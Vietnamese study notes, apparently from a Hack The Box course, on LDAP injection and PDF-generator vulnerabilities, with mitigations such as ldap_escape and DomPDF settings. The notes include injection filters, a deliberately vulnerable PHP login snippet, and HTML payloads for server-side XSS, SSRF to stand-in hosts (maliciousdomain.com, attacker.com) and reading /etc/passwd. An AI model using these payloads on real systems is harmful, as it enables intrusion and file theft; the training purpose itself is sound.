Nếu ứng dụng web hiển thị kết quả tìm kiếm cho người dùng, việc exfiltrate dữ liệu trở nên đơn giản khi có thể tiêm ký tự wildcard vào các trường tìm kiếm. Ví dụ:

Tiêm Wildcard vào Tên Người Dùng

Bộ lọc tìm kiếm: (&(uid=admin)(objectClass=account))
Khi tiêm wildcard vào uid: (&(uid=*)(objectClass=account))
Điều này sẽ hiển thị thông tin của tất cả tài khoản trong cơ sở dữ liệu LDAP.
Tiêm Wildcard vào ObjectClass

Bộ lọc tìm kiếm: (|(objectClass=organization)(objectClass=device))
Sau khi tiêm wildcard vào objectClass: (|(objectClass=organization)(objectClass=*))
Kết quả là tất cả các mục trong LDAP sẽ được trả về, giúp thực hiện việc exfiltration dữ liệu.
Blind Exploitation (Tấn Công Blind)
Nếu ứng dụng không hiển thị kết quả tìm kiếm, ta có thể sử dụng phương pháp "blind" để exfiltrate dữ liệu thông qua sự khác biệt trong phản hồi từ web ứng dụng, giống như cách thực hiện blind SQL Injection.

Tấn công Bằng Cách Kiểm Tra Mật Khẩu

Ví dụ, nếu sử dụng bộ lọc như: (&(uid=htb-stdnt)(password=p@ssw0rd)), chúng ta có thể thử brute-force từng ký tự của mật khẩu.
Ví dụ, tiêm vào mật khẩu a* để kiểm tra xem mật khẩu có bắt đầu bằng "a" không. Nếu không, ta thử với b*, v.v.
Tiến hành như vậy cho đến khi toàn bộ mật khẩu được brute-forced thành công. Quá trình này có thể thực hiện cho tất cả các ký tự trong mật khẩu.
Exfiltrate Dữ Liệu Từ Các Thuộc Tính Khác

Ta cũng có thể exfiltrate dữ liệu từ các thuộc tính khác, chẳng hạn như thuộc tính description. Ví dụ, tiêm vào tên người dùng như sau: (&(uid=htb-stdnt)(|(description=*)(password=invalid))).
Kết quả là, nếu mật khẩu sai, điều kiện cho thuộc tính description sẽ được kiểm tra, cho phép ta brute-force từng ký tự của thuộc tính này.
Exfiltrate Dữ Liệu Các Thuộc Tính Khác
Nếu muốn xác định các thuộc tính có tồn tại trong bản ghi, ta có thể tiêm wildcard và xem phản hồi từ ứng dụng:
Thuộc tính hợp lệ: ứng dụng trả về kết quả tích cực.
Thuộc tính không hợp lệ: ứng dụng trả về kết quả tiêu cực.
Khuyến Cáo
Trong các cuộc tấn công blind LDAP injection, việc viết một script tự động sẽ giúp đẩy nhanh quá trình exfiltrate dữ liệu và brute-force các thuộc tính của người dùng.
Kết Luận
Blind LDAP injection cho phép tấn công viên khai thác thông tin từ LDAP mà không cần phải hiển thị trực tiếp kết quả truy vấn. Các phương pháp khai thác này có thể sử dụng wildcard hoặc tiêm điều kiện OR để truy xuất dữ liệu, ngay cả khi kết quả không được hiển thị cho người dùng.

Phòng Ngừa LDAP Injection

Sau khi đã thảo luận về các cách khai thác lỗ hổng LDAP Injection, chúng ta sẽ đi vào các biện pháp phòng ngừa để bảo vệ ứng dụng khỏi những nguy cơ này.

Các Biện Pháp Phòng Ngừa LDAP Injection
Escape Các Ký Tự Đặc Biệt
LDAP injection có thể xảy ra nếu dữ liệu đầu vào của người dùng không được xử lý đúng cách. Để phòng ngừa, chúng ta cần escape các ký tự đặc biệt trong LDAP như:

( (dấu mở ngoặc) → \28
) (dấu đóng ngoặc) → \29
* (dấu sao) → \2a
** (dấu gạch chéo ngược) → \5c
null byte → \00
Việc này giúp tránh các ký tự có thể được sử dụng để thay đổi cấu trúc của bộ lọc LDAP.

Ví Dụ Cụ Thể trong PHP Trong PHP, chúng ta có thể sử dụng hàm ldap_escape để escape dữ liệu đầu vào một cách tự động và an toàn. Dưới đây là ví dụ về cách sử dụng hàm này để phòng ngừa LDAP injection:

Mã không được bảo vệ:

php
Sao chép mã
// kết nối LDAP
const LDAP_HOST = "localhost";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=htb";
const LDAP_DN = "cn=ldapuser,dc=example,dc=htb";
const LDAP_PASS = "ldappassword";

// kết nối tới server
$conn = ldap_connect(LDAP_HOST, LDAP_PORT);
if (!$conn) {
    exit('Kết nối LDAP thất bại');
}

// thao tác bind
ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
$bind = ldap_bind($conn, LDAP_DN, LDAP_PASS);
if (!$bind) {
    exit('Thao tác bind LDAP thất bại');
}

// tìm kiếm
$filter = '(&(cn=' . $_POST['username'] . ')(userPassword=' . $_POST['password'] . '))';
$search = ldap_search($conn, LDAP_DC, $filter);
$entries = ldap_get_entries($conn, $search);
if ($entries['count'] > 0) {
    // đăng nhập thành công
    <SNIP>
} else {
    // đăng nhập thất bại
    <SNIP>
}
Mã đã bảo vệ (Sử dụng ldap_escape):

php
Sao chép mã
// kết nối LDAP
const LDAP_HOST = "localhost";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=htb";
const LDAP_DN = "cn=ldapuser,dc=example,dc=htb";
const LDAP_PASS = "ldappassword";

// kết nối tới server
$conn = ldap_connect(LDAP_HOST, LDAP_PORT);
if (!$conn) {
    exit('Kết nối LDAP thất bại');
}

// thao tác bind
ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
$bind = ldap_bind($conn, LDAP_DN, LDAP_PASS);
if (!$bind) {
    exit('Thao tác bind LDAP thất bại');
}

// tìm kiếm (với escape dữ liệu đầu vào)
$filter = '(&(cn=' . ldap_escape($_POST['username']) . ')(userPassword=' . ldap_escape($_POST['password']) . '))';
$search = ldap_search($conn, LDAP_DC, $filter);
$entries = ldap_get_entries($conn, $search);
if ($entries['count'] > 0) {
    // đăng nhập thành công
    <SNIP>
} else {
    // đăng nhập thất bại
    <SNIP>
}
Best Practices (Thực Hành Tốt) Bên cạnh việc escape đầu vào, chúng ta có thể áp dụng các thực hành tốt khác để bảo mật LDAP:

Giới Hạn Quyền Truy Cập: Tài khoản được sử dụng để bind tới LDAP server chỉ nên có quyền hạn tối thiểu cần thiết để thực hiện các thao tác tìm kiếm, tránh việc kẻ tấn công có thể truy xuất dữ liệu nhạy cảm nếu lỗ hổng xảy ra.

Sử Dụng Bind với Thông Tin Người Dùng: Thay vì sử dụng LDAP search để xác thực người dùng, ta có thể sử dụng bind với thông tin người dùng (username và password). Điều này giúp giảm thiểu khả năng LDAP injection vì không có bộ lọc tìm kiếm có thể bị tấn công.

Ví Dụ Mã Bảo Mật với Bind Thông Tin Người Dùng:

php
Sao chép mã
// kết nối LDAP
const LDAP_HOST = "localhost";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=htb";

// thông tin người dùng
$dn = "cn=" . ldap_escape($_POST['username'], "", LDAP_ESCAPE_DN) . ",dc=example,dc=htb";
$pw = $_POST['password'];

// kết nối tới server
$conn = ldap_connect(LDAP_HOST, LDAP_PORT);
if (!$conn) {
    exit('Kết nối LDAP thất bại');
}

// thao tác bind
ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
$bind = ldap_bind($conn, $dn, $pw);
if ($bind) {
    // đăng nhập thành công
    <SNIP>
} else {
    // đăng nhập thất bại
    <SNIP>
}
Tắt Anonymous Bind Anonymous Bind (kết nối không xác thực) nên được tắt trên server LDAP để đảm bảo rằng chỉ người dùng đã xác thực mới có thể thực hiện các thao tác với LDAP. Điều này sẽ làm giảm nguy cơ bị tấn công qua các lỗ hổng LDAP injection.

Kết Luận
Phòng ngừa LDAP injection có thể thực hiện qua việc escape đúng các ký tự đặc biệt trong các truy vấn LDAP, sử dụng bind với thông tin người dùng thay vì sử dụng các truy vấn tìm kiếm, và giới hạn quyền truy cập của tài khoản LDAP. Những biện pháp này sẽ giúp bảo vệ ứng dụng web khỏi những lỗ hổng LDAP injection nguy hiểm.

Introduction to PDF Generation Vulnerabilities
Nhiều ứng dụng web cung cấp tính năng tạo PDF, như hóa đơn hoặc báo cáo, trong đó chứa thông tin động từ người dùng. Trong các phần tiếp theo, chúng ta sẽ thảo luận về các cấu hình sai và lỗi có thể dẫn đến lỗ hổng bảo mật do HTML injection trong đầu vào cho các thư viện tạo PDF.

PDF Generation
Portable Document Format (PDF) là một định dạng tệp được thiết kế để cung cấp trình bày tài liệu độc lập với nền tảng. Vì PDF được sử dụng rộng rãi trong nhiều ứng dụng, việc tạo PDF là một tính năng phổ biến trong các ứng dụng web. Để kích hoạt tính năng này, các ứng dụng web sử dụng các thư viện hoặc plugin tạo PDF.

Tuy nhiên, các cấu hình sai, thiếu cấu hình đúng, và các phiên bản thư viện cũ có thể mở ra lỗ hổng bảo mật, chủ yếu là do người dùng nhập các dữ liệu độc hại mà không được kiểm tra và làm sạch đúng cách.

Các thư viện tạo PDF phổ biến mà các ứng dụng web thường sử dụng bao gồm:

TCPDF
html2pdf
mPDF
DomPDF
PDFKit
wkhtmltopdf
PD4ML
Vì ứng dụng web cần phải thiết kế giao diện của các tệp PDF cuối cùng, các thư viện này chấp nhận mã HTML làm đầu vào và sử dụng nó để tạo ra tệp PDF. Quá trình này bao gồm việc phân tích mã HTML, hiển thị nó và tạo PDF.

Ví dụ: wkhtmltopdf
wkhtmltopdf là một công cụ tạo PDF từ HTML, và nó có thể được tải xuống dưới dạng tệp nhị phân đã biên dịch sẵn. Lưu ý rằng có một cảnh báo bảo mật ở đầu trang của công cụ này, chỉ ra rằng sử dụng wkhtmltopdf với HTML không đáng tin cậy có thể dẫn đến việc chiếm quyền hoàn toàn trên máy chủ.

Cách sử dụng wkhtmltopdf:

Sau khi tải xuống wkhtmltopdf, bạn có thể cài đặt nó trên các bản phân phối Linux dựa trên Debian bằng cách chạy lệnh:
bash
Sao chép mã
sudo dpkg -i wkhtmltox_0.12.6.1-2.bullseye_amd64.deb
Bạn có thể chạy công cụ này với tùy chọn -h để hiển thị thông tin trợ giúp:
bash
Sao chép mã
wkhtmltopdf -h
Khi cung cấp URL cho wkhtmltopdf, nó sẽ tự động tải trang web và chuyển đổi nó thành PDF:
bash
Sao chép mã
wkhtmltopdf https://academy.hackthebox.com/ htb.pdf
Sau đó, bạn sẽ có một tệp PDF với nội dung trang web.
Ngoài ra, bạn có thể cung cấp tệp HTML địa phương để tạo ra một tệp PDF tương tự với:

bash
Sao chép mã
wkhtmltopdf ./index.html test.pdf
Phân tích Tệp PDF
Để xác định thư viện tạo PDF mà một ứng dụng web sử dụng, bạn có thể phân tích siêu dữ liệu của tệp PDF đã tạo. Các thư viện tạo PDF thường thêm thông tin vào các trường creator và producer trong siêu dữ liệu của PDF. Do đó, bạn chỉ cần có tệp PDF được tạo ra từ ứng dụng web và chạy công cụ ExifTool để hiển thị siêu dữ liệu.

Ví dụ sử dụng ExifTool:

Cài đặt ExifTool trên hệ thống:
bash
Sao chép mã
apt install libimage-exiftool-perl
Sử dụng ExifTool để hiển thị thông tin siêu dữ liệu của tệp PDF:
bash
Sao chép mã
exiftool invoice.pdf
Thông tin từ ExifTool sẽ cung cấp chi tiết về công cụ tạo PDF và phiên bản của nó, chẳng hạn như:

yaml
Sao chép mã
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
Bạn cũng có thể sử dụng công cụ pdfinfo để đạt được kết quả tương tự:

bash
Sao chép mã
pdfinfo invoice.pdf
Các vấn đề bảo mật tiềm ẩn
HTML Injection: Nếu ứng dụng web không xử lý đúng đầu vào HTML từ người dùng, người dùng có thể chèn mã JavaScript hoặc các đoạn mã độc hại khác vào tệp PDF, tạo cơ hội cho tấn công XSS hoặc tấn công khai thác lỗ hổng bảo mật của máy chủ.

Cross-Site Scripting (XSS): Việc không kiểm tra đầu vào HTML/JS có thể dẫn đến việc thực thi mã JavaScript độc hại khi mở tệp PDF trong trình duyệt, dẫn đến XSS.

Cấu hình sai: Sử dụng thư viện cũ hoặc không cấu hình đúng có thể tạo ra lỗ hổng bảo mật nghiêm trọng. Việc thiếu các biện pháp bảo vệ đầu vào và không sử dụng các thư viện được cập nhật có thể dẫn đến tấn công chiếm quyền điều khiển.

Kết luận
Để đảm bảo an toàn khi sử dụng tính năng tạo PDF trong các ứng dụng web, rất quan trọng phải kiểm tra và làm sạch đầu vào HTML/JS từ người dùng, sử dụng các phiên bản thư viện mới nhất, và tắt JavaScript trong các tệp PDF nếu không cần thiết. Việc phân tích các tệp PDF tạo ra từ ứng dụng giúp xác định loại thư viện và phiên bản sử dụng, giúp hướng tới việc xác định các lỗ hổng bảo mật tiềm ẩn.

Khai thác lỗ hổng trong thư viện tạo PDF

Khi thảo luận về cách và lý do tại sao các ứng dụng web sử dụng các thư viện tạo PDF, chúng ta sẽ tìm hiểu cách khai thác các lỗ hổng phát sinh từ chúng và các cấu hình sai gây ra các lỗ hổng này. Tất cả các lỗ hổng này đều yêu cầu người dùng cung cấp nội dung được chèn vào đầu vào HTML của trình tạo PDF.

1. Thực thi mã JavaScript
Lỗ hổng đầu tiên chúng ta sẽ khám phá là tiêm mã JavaScript, vì việc thực thi mã JavaScript được tiêm vào có thể mở ra các vector tấn công tiếp theo. Khi thư viện tạo PDF diễn giải đầu vào HTML, nó có thể thực thi mã JavaScript đã tiêm. Hơn nữa, vì thư viện tạo PDF chạy trên máy chủ, payload cũng sẽ được thực thi trên máy chủ, đó là lý do tại sao lỗ hổng này còn được gọi là Server-Side XSS.

Khai thác:

Nếu ứng dụng web cho phép chèn HTML vào nội dung (ví dụ: các ghi chú), mã JavaScript có thể được tiêm vào và thực thi.
Sau khi tạo PDF, ta có thể thấy rằng mã JavaScript đã được thực thi trên máy chủ, gây ra việc tiết lộ thông tin như đường dẫn của tệp tin trong hệ thống của máy chủ.
Ví dụ Payload:

html
Sao chép mã
<script>
  alert("Test1");
</script>
Kết quả là, chúng ta sẽ thấy chuỗi "test1" trong tệp PDF, cho thấy máy chủ đã thực thi mã JavaScript của chúng ta.

2. Lỗ hổng SSRF (Server-Side Request Forgery)
Một trong những lỗ hổng phổ biến khi kết hợp với việc tạo PDF là SSRF. Vì các tài liệu HTML thường tải các tài nguyên như stylesheet hoặc hình ảnh từ các nguồn bên ngoài, việc hiển thị một tài liệu HTML yêu cầu máy chủ phải gửi yêu cầu đến các nguồn bên ngoài đó. Khi chúng ta tiêm mã HTML tùy ý vào đầu vào của trình tạo PDF, chúng ta có thể buộc máy chủ gửi yêu cầu HTTP đến bất kỳ URL nào, bao gồm cả các ứng dụng web nội bộ.

Khai thác:

Chèn các thẻ HTML như <img> hoặc <link> trỏ tới các URL do chúng ta kiểm soát có thể gây ra các yêu cầu HTTP từ máy chủ đến các điểm cuối nội bộ.
Ví dụ Payload:

html
Sao chép mã
<img src="http://maliciousdomain.com/ssrftest1" />
Khi tạo PDF, chúng ta sẽ thấy rằng máy chủ đã gửi một yêu cầu HTTP đến URL của chúng ta. Nếu misconfiguration xảy ra, chúng ta có thể dễ dàng khai thác SSRF để lấy dữ liệu từ các API nội bộ.

3. Lỗ hổng LFI (Local File Inclusion)
Một lỗ hổng mạnh mẽ khác mà chúng ta có thể khai thác là LFI. Các thẻ HTML có thể được chèn để đọc các tệp tin cục bộ trên máy chủ. Đặc biệt, nếu máy chủ thực thi mã JavaScript tiêm vào, chúng ta có thể sử dụng XMLHttpRequest với giao thức file:// để đọc các tệp tin trên hệ thống.

Khai thác với JavaScript:

html
Sao chép mã
<script>
  var x = new XMLHttpRequest();
  x.onload = function() {
    document.write(this.responseText);
  };
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>
Kết quả là, nội dung của tệp passwd sẽ được hiển thị trong tệp PDF.

Khai thác mà không cần JavaScript: Nếu máy chủ không thực thi JavaScript, chúng ta có thể thử các thẻ như <iframe> hoặc <object> để nhúng tệp cục bộ vào PDF. Tuy nhiên, nếu các phương pháp này không hoạt động, chúng ta có thể sử dụng một kỹ thuật khác để giả mạo yêu cầu đến tệp tin cục bộ thông qua máy chủ của chúng ta, bằng cách tạo một tệp redirector.

Ví dụ Payload:

html
Sao chép mã
<iframe src="http://attacker.com/redirector.php?url=%2fetc%2fpasswd"></iframe>
Khi PDF được tạo, tệp passwd có thể bị rò rỉ nếu thư viện PDF cho phép chèn các tài nguyên từ bên ngoài.

4. Annotations và Attachments
Một tính năng khác của các tệp PDF là annotations và attachments, có thể được sử dụng để rò rỉ tệp tin cục bộ trên máy chủ. Một số thư viện tạo PDF hỗ trợ tính năng này, ví dụ như mPDF và PD4ML. Chúng ta có thể sử dụng các payload như sau để thêm tệp vào dưới dạng đính kèm trong PDF.

Ví dụ Payload (mPDF):

html
Sao chép mã
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
Khi mở tệp PDF, người dùng có thể nhấp vào annotation và tải về tệp /etc/passwd.

Kết luận
Việc khai thác lỗ hổng trong thư viện tạo PDF có thể gây ra nhiều mối đe dọa nghiêm trọng như XSS, SSRF, LFI và rò rỉ dữ liệu từ các API hoặc tệp tin cục bộ trên máy chủ. Các biện pháp phòng ngừa cần được thực hiện bao gồm việc kiểm tra và kiểm soát chặt chẽ dữ liệu người dùng đầu vào, đồng thời đảm bảo rằng các thư viện tạo PDF không thực thi mã độc hại và không cho phép tải các tệp tin không an toàn.

Để ngăn ngừa các lỗ hổng trong thư viện tạo PDF, cần thực hiện một số biện pháp bảo mật quan trọng để giảm thiểu nguy cơ bị tấn công. Dưới đây là một số phương pháp và cấu hình cần thiết để đảm bảo an toàn cho hệ thống:

1. Cấu hình không an toàn
Nhiều lỗ hổng bảo mật liên quan đến việc cấu hình không đúng các thư viện tạo PDF. Các cấu hình mặc định của nhiều thư viện có thể không đủ bảo mật, dẫn đến các vấn đề như SSRF, XSS hoặc RCE. Do đó, việc đọc tài liệu hướng dẫn và cấu hình đúng thư viện là rất quan trọng. Ví dụ, thư viện DomPDF có một tùy chọn cấu hình gọi là enable_remote, có thể tắt để ngăn chặn các lỗ hổng SSRF.

2. Vô hiệu hóa thực thi mã JavaScript và PHP
Một số thư viện hỗ trợ thực thi mã JavaScript hoặc PHP để tạo PDF động. Tuy nhiên, đây là một lỗ hổng bảo mật nghiêm trọng nếu bị lạm dụng. Cần đảm bảo rằng thư viện không cho phép thực thi mã PHP hoặc JavaScript, ví dụ như việc vô hiệu hóa tùy chọn isPhpEnabled trong DomPDF.

3. Mã hóa HTML Entity
Một trong những cách hiệu quả để ngăn chặn việc chèn mã HTML độc hại vào trong dữ liệu người dùng là mã hóa các ký tự HTML bằng cách sử dụng các hàm như htmlentities trong PHP. Hàm này sẽ chuyển các ký tự đặc biệt như < thành &lt;, > thành &gt;, giúp ngăn chặn việc chèn các thẻ HTML và mã JavaScript không mong muốn.

4. Giới hạn quyền truy cập vào tài nguyên bên ngoài và tệp tin cục bộ
Tài nguyên bên ngoài: Hạn chế việc truy cập vào tài nguyên bên ngoài (như hình ảnh và bảng mẫu) là cách tốt nhất để tránh SSRF. Nếu tài nguyên bên ngoài phải được sử dụng, một cách tiếp cận an toàn là tạo danh sách trắng các địa chỉ IP hoặc tên miền có thể truy cập.
Tệp tin cục bộ: Ngăn cấm truy cập vào các tệp tin cục bộ của hệ thống (ví dụ: /etc/passwd) là điều cần thiết để ngăn chặn các lỗ hổng Local File Inclusion (LFI).
5. Lưu trữ tài nguyên cục bộ
Để ngăn ngừa các lỗ hổng SSRF, nếu các tài nguyên bên ngoài cần được sử dụng (như hình ảnh, stylesheet), bạn có thể tải chúng xuống và lưu trữ cục bộ trước khi xử lý. Điều này giúp ngăn chặn các yêu cầu HTTP từ máy chủ web đến các tài nguyên bên ngoài, từ đó giảm thiểu khả năng bị tấn công.

6. Kiểm tra cấu hình thư viện tạo PDF
Luôn đảm bảo rằng bạn đã cấu hình đúng các tùy chọn bảo mật trong thư viện PDF bạn đang sử dụng. Đọc kỹ tài liệu hướng dẫn và áp dụng các phương pháp bảo mật của thư viện để giảm thiểu các nguy cơ tiềm ẩn. Các thư viện như mPDF, PD4ML và DomPDF có các tùy chọn cấu hình bảo mật mà bạn cần kiểm tra và vô hiệu hóa các tính năng nguy hiểm như hỗ trợ JavaScript hoặc PHP.

7. Các biện pháp bảo vệ bổ sung
Chạy các ứng dụng web trong môi trường hạn chế: Đảm bảo ứng dụng chạy trong các môi trường có hạn chế quyền truy cập, chẳng hạn như các quyền đọc/ghi vào các thư mục và tệp tin quan trọng trên máy chủ.
Kiểm tra thường xuyên: Định kỳ kiểm tra các ứng dụng web của bạn bằng các công cụ kiểm tra bảo mật và đảm bảo rằng mọi lỗ hổng bảo mật tiềm ẩn đều được phát hiện và vá lỗi.
8. Ví dụ thực tế: Kiểm tra bảo mật cho e-Shop
Khi thực hiện một cuộc kiểm tra bảo mật đối với một hệ thống thương mại điện tử (e-Shop), bạn có thể thử nghiệm các kỹ thuật khai thác lỗ hổng đã học, bao gồm việc chèn mã HTML độc hại vào các biểu mẫu nhập liệu, kiểm tra khả năng thực thi mã JavaScript trên server, hoặc xác minh các cấu hình của thư viện tạo PDF có dễ bị tấn công không. Cụ thể:

Kiểm tra XSS: Kiểm tra xem ứng dụng có thể thực thi mã JavaScript từ dữ liệu người dùng không.
Kiểm tra SSRF: Xác minh xem ứng dụng có thể gửi yêu cầu HTTP đến các tài nguyên không đáng tin cậy hoặc các dịch vụ nội bộ không mong muốn không.
Kiểm tra LFI: Xác nhận rằng ứng dụng không cho phép người dùng truy cập vào các tệp tin quan trọng trên hệ thống.
Tóm lại
Để ngăn ngừa các lỗ hổng bảo mật trong quá trình tạo PDF, bạn cần cấu hình đúng các thư viện tạo PDF, mã hóa các đầu vào của người dùng và kiểm tra kỹ các khả năng cho phép thực thi mã JavaScript hoặc PHP. Việc quản lý tài nguyên và bảo mật quyền truy cập vào các tệp tin nội bộ của máy chủ cũng rất quan trọng trong việc bảo vệ ứng dụng khỏi các tấn công tiềm ẩn.












